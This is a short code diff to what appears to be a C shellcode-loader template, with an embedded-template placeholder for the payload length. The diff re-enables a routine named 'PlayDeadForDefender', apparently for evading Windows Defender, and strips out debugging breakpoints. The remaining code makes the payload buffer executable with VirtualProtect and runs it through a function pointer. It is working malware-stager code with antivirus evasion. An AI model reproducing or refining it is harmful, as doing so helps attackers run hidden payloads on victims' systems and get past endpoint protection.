@@ -46,20 +46,18 @@ int main() {
 
     unsigned long scsize = <%= payload_length %>;
     
-//    if( !CALL(&PlayDeadForDefender) )
-//    {
-//      return 1;
-//    }
+    if( !CALL(&PlayDeadForDefender) )
+    {
+      return 1;
+    }
 
     char * payload_fnc = (char*)bPayload;
-    asm("int3");
 
     if(!VirtualProtect(bPayload, scsize, PAGE_EXECUTE_READWRITE, &dwOldProtect))
     {
       return 1;
     }
 	
-    asm("int3");
     (*(void (*)()) payload_fnc)();
 
 	  return 0;
